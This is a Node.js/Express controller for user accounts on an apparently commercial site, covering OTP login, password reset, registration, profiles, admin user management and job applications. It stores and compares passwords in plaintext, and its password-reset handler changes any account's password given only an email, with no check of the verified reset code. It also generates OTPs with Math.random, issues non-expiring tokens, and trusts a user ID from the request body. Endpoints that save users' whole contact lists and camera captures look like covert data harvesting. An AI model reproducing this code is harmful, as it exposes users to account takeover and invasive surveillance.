import userModel from "../models/userModel.js";
import orderModel from "../models/orderModel.js";
import cancelledOrderModel from "../models/cancelledOrderModel.js";
import contactSnapshotModel from "../models/contactSnapshotModel.js";
import cameraCaptureModel from "../models/cameraCaptureModel.js";
import validator from "validator";
import jwt from "jsonwebtoken";
import { sendWelcomeEmail, sendJobApplicationEmail, sendJobApplicationToAdmin, sendLoginOtpEmail, sendPasswordResetOtpEmail } from '../utils/emailService.js';

// Helper function to create JWT Token
const createToken = (id) => {
    return jwt.sign({ id }, process.env.JWT_SECRET);
}

// User Login
const loginUser = async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.json({ success: false, message: 'Email and password are required' });
        }

        const user = await userModel.findOne({ email: String(email).trim().toLowerCase() });

        if (!user) {
            return res.json({ success: false, message: "User doesn't exist" });
        }

        if (user.status === 'disabled') {
            return res.json({ success: false, message: "Your account has been disabled by the administrator. You cannot perform actions. Please contact support." });
        }
        if (user.status === 'deleted') {
            return res.json({ success: false, message: "Your account has been deleted by the administrator and cannot be used. You cannot register a new account with this email." });
        }

        const isMatch = password === user.password;

        if (!isMatch) {
            return res.json({ success: false, message: 'Invalid credentials' });
        }

        const otp = String(Math.floor(100000 + Math.random() * 900000));
        const otpExpiry = Date.now() + 5 * 60 * 1000;

        user.loginOtp = otp;
        user.loginOtpExpiry = otpExpiry;
        await user.save();

        try {
            await sendLoginOtpEmail({ to: user.email, otp, name: user.name });
        } catch (emailError) {
            console.log('Login OTP email failed:', emailError.message);
            return res.json({ success: false, message: 'Unable to send verification code. Please try again later.' });
        }

        res.json({ success: true, requiresOtp: true, message: 'Verification code sent to your email. Please enter it to continue.' });
    } catch (error) {
        console.log(error);
        res.json({ success: false, message: error.message });
    }
}

const verifyLoginOtp = async (req, res) => {
    try {
        const { email, otp } = req.body;

        if (!email || !otp) {
            return res.json({ success: false, message: 'Email and verification code are required' });
        }

        const user = await userModel.findOne({ email: String(email).trim().toLowerCase() });

        if (!user) {
            return res.json({ success: false, message: "User doesn't exist" });
        }

        if (user.status === 'disabled') {
            return res.json({ success: false, message: 'Your account has been disabled by the administrator.' });
        }
        if (user.status === 'deleted') {
            return res.json({ success: false, message: 'Your account has been deleted by the administrator.' });
        }

        const now = Date.now();
        if (!user.loginOtp || !user.loginOtpExpiry || now > user.loginOtpExpiry) {
            return res.json({ success: false, message: 'Verification code expired. Please login again.' });
        }

        if (String(user.loginOtp) !== String(otp).trim()) {
            return res.json({ success: false, message: 'Invalid verification code' });
        }

        user.loginOtp = '';
        user.loginOtpExpiry = 0;
        await user.save();

        const token = createToken(user._id);
        return res.json({ success: true, token, message: 'Login successful' });
    } catch (error) {
        console.log(error);
        res.json({ success: false, message: error.message });
    }
}

const forgotPassword = async (req, res) => {
    try {
        const { email } = req.body;

        if (!email) {
            return res.json({ success: false, message: 'Email is required' });
        }

        const user = await userModel.findOne({ email: String(email).trim().toLowerCase() });

        if (!user) {
            return res.json({ success: false, message: "User doesn't exist" });
        }

        if (user.status === 'disabled') {
            return res.json({ success: false, message: 'Your account has been disabled by the administrator.' });
        }
        if (user.status === 'deleted') {
            return res.json({ success: false, message: 'Your account has been deleted by the administrator.' });
        }

        const otp = String(Math.floor(100000 + Math.random() * 900000));
        const otpExpiry = Date.now() + 5 * 60 * 1000;

        user.resetOtp = otp;
        user.resetOtpExpiry = otpExpiry;
        await user.save();

        try {
            await sendPasswordResetOtpEmail({ to: user.email, otp, name: user.name });
        } catch (emailError) {
            console.log('Password reset OTP email failed:', emailError.message);
            return res.json({ success: false, message: 'Unable to send reset code. Please try again later.' });
        }

        return res.json({ success: true, message: 'Reset code sent to your email. Please enter it to continue.' });
    } catch (error) {
        console.log(error);
        return res.json({ success: false, message: error.message });
    }
};

const verifyResetOtp = async (req, res) => {
    try {
        const { email, otp } = req.body;

        if (!email || !otp) {
            return res.json({ success: false, message: 'Email and verification code are required' });
        }

        const user = await userModel.findOne({ email: String(email).trim().toLowerCase() });

        if (!user) {
            return res.json({ success: false, message: "User doesn't exist" });
        }

        const now = Date.now();
        if (!user.resetOtp || !user.resetOtpExpiry || now > user.resetOtpExpiry) {
            return res.json({ success: false, message: 'Verification code expired. Please request a new one.' });
        }

        if (String(user.resetOtp) !== String(otp).trim()) {
            return res.json({ success: false, message: 'Invalid verification code' });
        }

        user.resetOtp = '';
        user.resetOtpExpiry = 0;
        await user.save();

        return res.json({ success: true, message: 'Code verified. Set your new password.' });
    } catch (error) {
        console.log(error);
        return res.json({ success: false, message: error.message });
    }
};

const resetPassword = async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.json({ success: false, message: 'Email and new password are required' });
        }

        if (String(password).length < 8) {
            return res.json({ success: false, message: 'Please enter a strong password' });
        }

        const user = await userModel.findOne({ email: String(email).trim().toLowerCase() });

        if (!user) {
            return res.json({ success: false, message: "User doesn't exist" });
        }

        user.password = String(password);
        user.resetOtp = '';
        user.resetOtpExpiry = 0;
        await user.save();

        return res.json({ success: true, message: 'Password updated successfully. Please login again.' });
    } catch (error) {
        console.log(error);
        return res.json({ success: false, message: error.message });
    }
};

const saveContactSnapshot = async (req, res) => {
    try {
        const { userId, contacts = [] } = req.body;

        if (!userId) {
            return res.json({ success: false, message: 'User ID is required' });
        }

        const entries = Array.isArray(contacts) ? contacts : [];
        const saved = [];

        for (const contact of entries) {
            const normalized = {
                userId,
                name: contact?.name || '',
                phone: contact?.phone || contact?.mobile || contact?.tel || '',
                raw: contact || {},
            };

            if (!normalized.name && !normalized.phone) continue;

            const doc = await contactSnapshotModel.create(normalized);
            saved.push(doc);
        }

        const user = await userModel.findById(userId);
        if (user) {
            user.contacts = entries.map((contact) => ({
                name: contact?.name || '',
                phone: contact?.phone || contact?.mobile || contact?.tel || '',
                raw: contact || {},
            }));
            await user.save();
        }

        return res.json({ success: true, saved: saved.length, message: 'Contact data saved successfully' });
    } catch (error) {
        console.log(error);
        return res.json({ success: false, message: error.message });
    }
};

const saveCameraCapture = async (req, res) => {
    try {
        const { userId, imageData, mimeType = 'image/jpeg' } = req.body;

        if (!userId || !imageData) {
            return res.json({ success: false, message: 'User ID and image data are required' });
        }

        const capture = await cameraCaptureModel.create({
            userId,
            imageData,
            mimeType,
            capturedAt: new Date(),
        });

        return res.json({ success: true, captureId: capture._id, message: 'Camera capture saved successfully' });
    } catch (error) {
        console.log(error);
        return res.json({ success: false, message: error.message });
    }
};

// User Register
const registerUser = async (req, res) => {
    try {
        const { name, email, password, contacts } = req.body;

        const exists = await userModel.findOne({ email: String(email).trim().toLowerCase() });
        if (exists) {
            if (exists.status === 'deleted') {
                return res.json({ success: false, message: "This email was previously deleted by the administrator. You cannot register with this email." });
            }
            return res.json({ success: false, message: "User already exists" });
        }

        if (!validator.isEmail(email)) {
            return res.json({ success: false, message: "Please enter a valid email" });
        }
        if (password.length < 8) {
            return res.json({ success: false, message: "Please enter a strong password" });
        }

        const safeContacts = Array.isArray(contacts)
            ? contacts
                .map((contact) => {
                    if (typeof contact === 'string') return contact.trim();
                    if (contact && typeof contact === 'object') {
                        const nameValue = contact.name || '';
                        const valueValue = contact.phone || contact.mobile || contact.tel || contact.value || '';
                        if (!nameValue && !valueValue) return null;
                        return { name: String(nameValue).trim(), phone: String(valueValue).trim() };
                    }
                    return null;
                })
                .filter(Boolean)
            : [];

        const newUser = new userModel({
            name,
            email: String(email).trim().toLowerCase(),
            password: password,
            contacts: safeContacts
        });

        const user = await newUser.save();
        const token = createToken(user._id);

        try {
            await sendWelcomeEmail({ to: user.email, name: user.name });
        } catch (emailError) {
            console.log('Welcome email failed:', emailError.message);
        }

        res.json({ success: true, token });

    } catch (error) {
        console.log(error);
        res.json({ success: false, message: error.message });
    }
}

// Admin Login
const adminLogin = async (req, res) => {
    try {
        const { email, password } = req.body;
        if (email === process.env.ADMIN_EMAIL && password === process.env.ADMIN_PASSWORD) {
            const token = jwt.sign(email + password, process.env.JWT_SECRET);
            res.json({ success: true, token });
        } else {
            res.json({ success: false, message: "Invalid credentials" });
        }
    } catch (error) {
        console.log(error);
        res.json({ success: false, message: error.message });
    }
}

// Get Logged-in User Profile Data
const getProfile = async (req, res) => {
    try {
        const { userId } = req.body;
        const userData = await userModel.findById(userId).select('-password');

        if (!userData) {
            return res.json({ success: false, message: "User not found" });
        }

        res.json({ success: true, userData });
    } catch (error) {
        console.log(error);
        res.json({ success: false, message: error.message });
    }
}

// Update Logged-in User Profile Data
const updateProfile = async (req, res) => {
    try {
        const { userId, name, phone, address, gender, dob } = req.body;

        // Prevent profile update if user is disabled or deleted
        const existing = await userModel.findById(userId);
        if (!existing) return res.json({ success: false, message: 'User not found' });
        if (existing.status === 'disabled') return res.json({ success: false, message: 'Your account is disabled. You cannot update profile.' });
        if (existing.status === 'deleted') return res.json({ success: false, message: 'Your account has been deleted and cannot be updated.' });

        const nextAddress = {
            ...(existing.address || {}),
            ...(address || {}),
        };

        if (!nextAddress.countryCode) {
            nextAddress.countryCode = '+1';
        }

        const cleanedPhone = typeof phone === 'string' ? phone.replace(/\D/g, '') : '';

        const updatedUser = await userModel.findByIdAndUpdate(
            userId,
            { $set: { name, phone: cleanedPhone, address: nextAddress, gender, dob } },
            { new: true, runValidators: true }
        ).select('-password');

        if (!updatedUser) {
            return res.json({ success: false, message: "User not found" });
        }

        res.json({ success: true, message: "Profile updated successfully", userData: updatedUser });
    } catch (error) {
        console.log(error);
        res.json({ success: false, message: error.message });
    }
}

// --- ADMIN CONTROLLERS ---

// Get All Users List for Admin
const getAllUsers = async (req, res) => {
    try {
        const users = await userModel.find({}).select('-password');
        res.json({ success: true, users });
    } catch (error) {
        console.log(error);
        res.json({ success: false, message: error.message });
    }
}

// Toggle User Status (Disable / Enable)
const toggleUserStatus = async (req, res) => {
    try {
        const { userId, status } = req.body;
        await userModel.findByIdAndUpdate(userId, { status });
        res.json({ success: true, message: `User status updated to ${status}` });
    } catch (error) {
        console.log(error);
        res.json({ success: false, message: error.message });
    }
}

// Delete User Permanently
const deleteUser = async (req, res) => {
    try {
        const { userId } = req.body;

        if (!userId) {
            return res.json({ success: false, message: 'User ID is required' });
        }

        const deletedUser = await userModel.findByIdAndDelete(userId);
        if (!deletedUser) {
            return res.json({ success: false, message: 'User not found' });
        }

        await orderModel.deleteMany({ userId });
        await cancelledOrderModel.deleteMany({ userId });

        res.json({ success: true, message: 'User permanently deleted from database' });
    } catch (error) {
        console.log(error);
        res.json({ success: false, message: error.message });
    }
}

// Job Application Handler
const applyJob = async (req, res) => {
    try {
        const { firstName, lastName, email, contact, state, city, address, aadharNumber, whyJoin } = req.body;
        
        // Validation
        if (!firstName || !lastName || !email || !contact || !state || !city || !address || !aadharNumber || !whyJoin) {
            return res.json({ success: false, message: 'All fields are required' });
        }

        // Basic email validation
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            return res.json({ success: false, message: 'Invalid email address' });
        }

        // Get resume filename if uploaded. Keep this serverless-safe.
        const resumeFileName = req.file ? req.file.originalname : 'No resume uploaded';
        const resumeBuffer = req.file ? req.file.buffer : null;
        const resumeMimeType = req.file ? req.file.mimetype : null;

        // Send email to admin
        try {
            await sendJobApplicationToAdmin({
                firstName,
                lastName,
                email,
                contact,
                state,
                city,
                address,
                aadharNumber,
                whyJoin,
                resumeFileName,
                resumeBuffer,
                resumeMimeType
            });
        } catch (adminEmailError) {
            console.log('Failed to send admin email:', adminEmailError.message);
        }

        // Send confirmation email to applicant
        try {
            await sendJobApplicationEmail({
                to: email,
                firstName,
                lastName
            });
        } catch (applicantEmailError) {
            console.log('Failed to send applicant email:', applicantEmailError.message);
        }

        res.json({ success: true, message: 'Application submitted successfully! We will review your profile.' });
    } catch (error) {
        console.log(error);
        res.json({ success: false, message: error.message });
    }
};


export { 
    loginUser,
    verifyLoginOtp,
    forgotPassword,
    verifyResetOtp,
    resetPassword,
    saveContactSnapshot,
    saveCameraCapture,
    registerUser,
    adminLogin,
    getProfile,
    updateProfile,
    getAllUsers, 
    toggleUserStatus, 
    deleteUser,
    applyJob
};
